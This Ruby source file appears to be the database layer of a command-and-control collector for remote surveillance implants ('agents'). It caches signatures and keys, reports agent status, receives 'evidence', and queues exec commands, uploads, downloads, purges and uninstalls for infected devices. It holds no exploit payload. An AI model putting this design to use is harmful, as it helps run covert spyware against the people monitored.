#
#  The DB abstraction layer
#

# relatives
require_relative 'config.rb'
require_relative 'db_rest.rb'
require_relative 'db_cache.rb'
require_relative 'my_ip.rb'

# from RCS::Common
require 'rcs-common/trace'

# system
require 'digest/md5'
require 'uuidtools'
require 'socket'

module RCS
module Collector

class DB
  include Singleton
  include RCS::Tracer

  ACTIVE_AGENT = 0
  DELETED_AGENT = 1
  CLOSED_AGENT = 2
  QUEUED_AGENT = 3
  NO_SUCH_AGENT = 4
  UNKNOWN_AGENT = 5

  AGENT_STATUSES = {active: 0, delete: 1, closed: 2, queued: 3, noagent: 4, unknown: 5}

  attr_reader :agent_signature
  attr_reader :network_signature
  attr_reader :check_signature
  attr_reader :crc_signature
  attr_reader :sha1_signature

  def initialize
    # database address
    @host = Config.instance.global['DB_ADDRESS'].to_s + ":" + Config.instance.global['DB_PORT'].to_s

    # the username is an unique identifier for each machine.
    @username = local_instance

    # the password is a signature taken from a file
    @password = File.read(Config.instance.file('DB_SIGN'))

    # the version of the collector
    @build = File.read(Dir.pwd + '/config/VERSION_BUILD')

    # status of the db connection
    @available = false

    # global (per customer) agent signature
    @agent_signature = nil
    # signature for the network elements
    @network_signature = nil
    # signature for the integrity check
    @check_signature = nil
    @crc_signature = nil
    @sha1_signature = nil
    # class keys
    @factory_keys = {}
    
    # the current db layer REST
    @db_rest = DB_rest.new @host
    
    return @available
  end

  def local_instance
    # we use the MD5 of the MAC address
    # if mac address is not available, fallback to hostname
    begin
      unique_id = UUIDTools::UUID.mac_address.to_s
    rescue Exception => e
      unique_id = Socket.gethostname
    end
    Digest::MD5.hexdigest(unique_id)
  end

  def connect!(type)
    trace :info, "Checking the DB connection [#{@host}]..."

    # special case for the collector
    @username += ':' + ($external_address || '') if type.eql? :collector and not @username[':']

    if @db_rest.login(@username, @password, @build, type)
      @available = true
      trace :info, "Connected to [#{@host}]"
    else
      @available = false
      trace :error, "Cannot login to DB"
    end
    return @available
  end

  def disconnect!
    @db_rest.logout
    @available = false
    trace :info, "Disconnected from [#{@host}]"
  end

  private
  def connected=(value)
    # set this variable accordingly in each method to detect when the db is down
    @available = value
    if @available then
      trace :info, "DB is up and running"
    else
      trace :warn, "DB is now considered NOT available"
    end
  end

  public
  def connected?
    # is the database available ?
    return @available
  end

  # wrapper method for all the calls to the underlying layers
  # on error, it will consider the db failed
  def db_rest_call(method, *args)
    begin
      return @db_rest.send method, *args
    rescue
      self.connected = false
      return nil
    end
  end

  def cache_init
    # if the db is available, clear the cache and populate it again
    if @available
      # get the global signature (per customer) for all the agents
      bck_sig = db_rest_call :agent_signature
      @agent_signature = Digest::MD5.digest bck_sig unless bck_sig.nil?

      # get the network signature to communicate with the network elements
      net_sig = db_rest_call :network_signature
      @network_signature = net_sig unless net_sig.nil?

      # get the integrity check signature
      check_sig = db_rest_call :check_signature
      @check_signature = check_sig unless check_sig.nil?
      crc_sig = db_rest_call :crc_signature
      @crc_signature = crc_sig unless crc_sig.nil?
      sha1_sig = db_rest_call :sha1_signature
      @sha1_signature = sha1_sig unless sha1_sig.nil?

      # get the factory key of every agent
      keys = db_rest_call :factory_keys
      @factory_keys = keys unless keys.nil?

      # errors while retrieving the data from the db
      return false if bck_sig.nil? or keys.nil? or net_sig.nil? or check_sig.nil?

      trace :info, "Emptying the DB cache..."
      # empty the cache and populate it again
      DBCache.empty!

      trace :info, "Populating the DB cache..."
      # save in the permanent cache
      DBCache.agent_signature = bck_sig
      trace :info, "Agent signature saved in the DB cache"
      DBCache.network_signature = net_sig
      trace :info, "Network signature saved in the DB cache"
      DBCache.check_signature = check_sig
      DBCache.crc_signature = crc_sig
      DBCache.sha1_signature = sha1_sig
      trace :info, "Integrity check signature saved in the DB cache"
      DBCache.add_factory_keys @factory_keys
      trace :info, "#{@factory_keys.length} entries saved in the the DB cache"

      return true
    end

    # the db is not available
    # check if the cache already exists and has some entries
    if DBCache.length > 0
      trace :info, "Loading the DB cache..."

      # populate the memory cache from the permanent one
      @agent_signature = Digest::MD5.digest DBCache.agent_signature unless DBCache.agent_signature.nil?
      @network_signature = DBCache.network_signature unless DBCache.network_signature.nil?
      @check_signature = DBCache.check_signature unless DBCache.check_signature.nil?
      @crc_signature = DBCache.crc_signature unless DBCache.crc_signature.nil?
      @sha1_signature = DBCache.sha1_signature unless DBCache.sha1_signature.nil?
      @factory_keys = DBCache.factory_keys

      trace :info, "#{@factory_keys.length} entries loaded from DB cache"

      return true
    end

    # no db and no cache...
    return false
  end

  def update_status(component, ip, status, message, stats, type, version)
    return unless @available

    trace :debug, "[#{component}]: #{status} #{message} #{stats}"
    db_rest_call :status_update, component, ip, status, message, stats[:disk], stats[:cpu], stats[:pcpu], type, version
  end

  def valid_factory_key?(key)
    key && key.respond_to?(:[]) && key['key'].to_s.size > 0 && key.has_key?('good')
  end

  def factory_key_of(build_id)
    # if we already have it return otherwise we have to ask to the db
    return Digest::MD5.digest(@factory_keys[build_id]['key']) if valid_factory_key?(@factory_keys[build_id])

    trace :info, "Cache Miss: factory key for #{build_id}, asking to the db..."

    unless @available
      trace :warn, "Db unavailable. Cannot retrieve missed key."
      return nil
    end

    # ask to the db the factory key
    resp = db_rest_call :factory_keys, build_id

    # save the factory key in the cache (memory and permanent)
    if resp && valid_factory_key?(resp[build_id])
      trace :info, "Received key for #{build_id}. Saving into cache."

      @factory_keys[build_id] = resp[build_id]

      # store it in the permanent cache
      DBCache.add_factory_keys(resp)

      # return the key
      return Digest::MD5.digest resp[build_id]['key']
    end

    # key not found
    return nil
  end

  # returns ALWAYS the status of an agent
  def agent_status(build_id, instance_id, platform, demo, level)
    # if the database has gone, reply with a fake response in order for the sync to continue
    return agent_cached_status(build_id) unless @available

    trace :debug, "Asking the status of [#{build_id}_#{instance_id}] to the db"

    # ask the database the status of the agent
    agent = db_rest_call :agent_status, build_id, instance_id, platform, demo, level

    trace :info, "Status of [#{build_id}_#{instance_id}] is: #{AGENT_STATUSES.key(agent[:status])}, #{level}, #{agent[:good] ? 'good' : 'bad'}"

    return [agent[:status], agent[:id], agent[:good]]
  rescue Exception => e
    trace :info, "Cannot determine status of [#{build_id}_#{instance_id}], getting status from cache"
    cached = agent_cached_status(build_id)
    trace :info, "Cached status is: #{AGENT_STATUSES.key(cached[0])}, #{level}, #{cached[2] ? 'good' : 'bad'}"
    return cached
  end

  def agent_cached_status(build_id)
    cached_good_value = DBCache.factory_keys[build_id]['good'] rescue false
    cached_good_value = cached_good_value.to_s == 'true' ? true : false
    return [DB::UNKNOWN_AGENT, 0, cached_good_value]
  end

  def agent_availables(session)
    return [] unless @available

    db_rest_call :agent_availables, session
  end

  def agent_uninstall(agent_id)
    # database is down, continue
    return unless @available

    db_rest_call :agent_uninstall, agent_id
  end

  def sync_start(session, version, user, device, source, time)
    # database is down, continue
    return unless @available

    # tell the db that the agent has synchronized
    db_rest_call :sync_start, session, version, user, device, source, time
  end

  def sync_update(session, version, user, device, source, time)
    # database is down, continue
    return unless @available

    # tell the db that the agent has synchronized
    db_rest_call :sync_update, session, version, user, device, source, time
  end

  def sync_timeout(session)
    # database is down, continue
    return unless @available

    db_rest_call :sync_timeout, session
  end

  def sync_end(session)
    # database is down, continue
    return unless @available

    db_rest_call :sync_end, session
  end

  def send_evidence(instance, evidence)
    return unless @available

    db_rest_call :send_evidence, instance, evidence
  end

  def get_worker(instance)
    return unless @available

    # replace the _ to : in the instance before askig to db (which wants it in that format)
    mod_instance = instance.dup
    mod_instance[14] = ':'
    db_rest_call :get_worker, mod_instance
  end

  def new_conf?(bid)
    # check if we have the config in the cache
    # probably and old one not yet sent
    return true if DBCache.new_conf? bid
    # cannot reach the db, return false
    return false unless @available

    # retrieve the config from the db
    config = db_rest_call :new_conf, bid

    # put the config in the cache
    DBCache.save_conf bid, config unless config.nil?

    return (config.nil?) ? false : true
  end

  def new_conf(bid)
    # retrieve the config from the cache
    config = DBCache.new_conf bid

    return nil if config.nil?

    # delete the conf from the cache
    DBCache.del_conf bid

    return config
  end

  def activate_conf(bid)
    # set the status to "activated" in the db
    db_rest_call :activate_conf, bid if @available
  end

  def new_uploads?(bid)
    # check if we have the uploads in the cache
    # probably and old one not yet sent
    return true if DBCache.new_uploads? bid
    # cannot reach the db, return false
    return false unless @available

    # retrieve the upload from the db
    uploads = db_rest_call :new_uploads, bid

    # put the upload in the cache
    DBCache.save_uploads bid, uploads unless (uploads.nil? or uploads.empty?) 

    return (uploads.nil? or uploads.empty?) ? false : true
  end

  def new_uploads(bid)
    # retrieve the uploads from the cache
    upload, left = DBCache.new_upload bid

    return nil if upload.nil?

    # delete from the db
    db_rest_call :del_upload, bid, upload[:id] if @available

    # delete the upload from the cache
    DBCache.del_upload bid, upload[:id]

    return upload[:upload], left
  end

  def new_upgrade?(bid)
    # cannot reach the db, return false
    return false unless @available

    # remove any pending entry in the cache
    # the upgrade must be retrieved always from the db to avoid partial
    # corrupted multi-file upgrade
    DBCache.clear_upgrade bid

    # retrieve the upgrade from the db
    upgrades = db_rest_call :new_upgrades, bid

    # put the upgrade in the cache
    DBCache.save_upgrade bid, upgrades unless (upgrades.nil? or upgrades.empty?)

    return (upgrades.nil? or upgrades.empty?) ? false : true
  end

  def new_upgrade(bid, flavor)
    # retrieve the uploads from the cache
    upgrade, left = DBCache.new_upgrade(bid, flavor)

    return nil if upgrade.nil?

    # delete the upgrade from the cache
    DBCache.del_upgrade bid, upgrade[:id]

    # delete from the db only if all the file have been transmitted
    if left == 0
      DBCache.del_upgrade bid
      db_rest_call :del_upgrade, bid if @available
    end

    return upgrade[:upgrade], left
  end

  def new_downloads?(bid)
    # check if we have the downloads in the cache
    # probably and old one not yet sent
    return true if DBCache.new_downloads? bid
    # cannot reach the db, return false
    return false unless @available

    # retrieve the downloads from the db
    downloads = db_rest_call :new_downloads, bid

    # put the download in the cache
    DBCache.save_downloads bid, downloads unless (downloads.nil? or downloads.empty?)

    return (downloads.nil? or downloads.empty?) ? false : true
  end

  def new_downloads(bid)
    # retrieve the downloads from the cache
    downloads = DBCache.new_downloads bid

    return [] if downloads.empty?

    down = []
    # remove the downloads from the db
    downloads.each_pair do |key, value|
      # delete the entry from the db
      db_rest_call :del_download, bid, key if @available
      # return only the filename
      down << value
    end

    # delete the download from the cache
    DBCache.del_downloads bid

    return down
  end

  def new_filesystems?(bid)
    # check if we have the filesystems in the cache
    # probably and old one not yet sent
    return true if DBCache.new_filesystems? bid
    # cannot reach the db, return false
    return false unless @available

    # retrieve the filesystem from the db
    filesystems = db_rest_call :new_filesystems, bid

    # put the filesystem in the cache
    DBCache.save_filesystems bid, filesystems unless (filesystems.nil? or filesystems.empty?)

    return (filesystems.nil? or filesystems.empty?) ? false : true
  end

  def new_filesystems(bid)
    # retrieve the filesystems from the cache
    filesystems = DBCache.new_filesystems bid

    return [] if filesystems.empty?

    files = []
    # remove the filesystems from the db
    filesystems.each_pair do |key, value|
      # delete the entry from the db
      db_rest_call :del_filesystem, bid, key if @available
      # return only the {:depth => , :path => } hash
      files << value
    end

    # delete the filesystem from the cache
    DBCache.del_filesystems bid

    return files
  end

  def purge?(bid)
    # cannot reach the db, return false
    return false unless @available

    # retrieve the values from the db
    values = db_rest_call :purge, bid

    return values != [0, 0]
  end

  def purge(bid)
    # cannot reach the db, return false
    return [0, 0] unless @available

    # retrieve the values from the db
    values = db_rest_call :purge, bid
    db_rest_call :del_purge, bid

    return values
  end

  def new_exec?(bid)
    # check if we have any exec in the cache
    # probably and old one not yet sent
    return true if DBCache.new_exec? bid
    # cannot reach the db, return false
    return false unless @available

    # retrieve the exec from the db
    commands = db_rest_call :new_exec, bid

    # put the download in the cache
    DBCache.save_exec bid, commands unless (commands.nil? or commands.empty?)

    return (commands.nil? or commands.empty?) ? false : true
  end

  def new_exec(bid)
    # retrieve the downloads from the cache
    commands = DBCache.new_exec bid

    return [] if commands.empty?

    down = []
    # remove the exec from the db
    commands.each_pair do |key, value|
      # delete the entry from the db
      db_rest_call :del_exec, bid, key if @available
      # return only the filename
      down << value
    end

    # delete the download from the cache
    DBCache.del_exec bid

    return down
  end

  def injectors
    # return empty if not available
    return [] unless @available

    # TODO: insert some cache here

    # ask the db
    ret = db_rest_call :get_injectors

    # return the results or empty on error
    return ret || []
  end

  def collectors
    # return empty if not available
    return [] unless @available

    # TODO: insert some cache here

    # ask the db
    ret = db_rest_call :get_collectors

    # return the results or empty on error
    return ret || []
  end

  def update_injector_version(id, version)
    return unless @available
    db_rest_call :injector_set_version, id, version
  end

  def update_collector_version(id, version)
    return unless @available
    db_rest_call :collector_set_version, id, version
  end

  def injector_config(id)
    return unless @available
    db_rest_call :injector_config, id
  end

  def injector_upgrade(id)
    return unless @available
    db_rest_call :injector_upgrade, id
  end

  def injector_add_log(id, time, type, desc)
    return unless @available
    db_rest_call :injector_add_log, id, time, type, desc
  end

  def collector_add_log(id, time, type, desc)
    return unless @available
    db_rest_call :collector_add_log, id, time, type, desc
  end

  def first_anonymizer
    return {} unless @available
    db_rest_call :first_anonymizer
  end

  def collector_address
    return {} unless @available
    db_rest_call :collector_address
  end

  def public_delete(file)
    return unless @available
    db_rest_call :public_delete, file
  end

  def network_protocol_cookies(force=false)
    # use in memory cache for the results
    cookies = @np_cookies || []

    return cookies unless @available
    return cookies if not cookies.nil? and not cookies.empty? and not force

    @np_cookies = db_rest_call :network_protocol_cookies if @available
    return @np_cookies
  end

  def updater_signature
    signature_file = Config.instance.file("rcs-updater.sig")
    signature = File.exists?(signature_file) ? File.read(signature_file) : ''

    if signature.empty?
      signature = db_rest_call(:updater_signature)
      File.open(signature_file, 'wb') { |file| file.write(signature) }
    end

    return signature
  end

end #DB

end #Collector::
end #RCS::
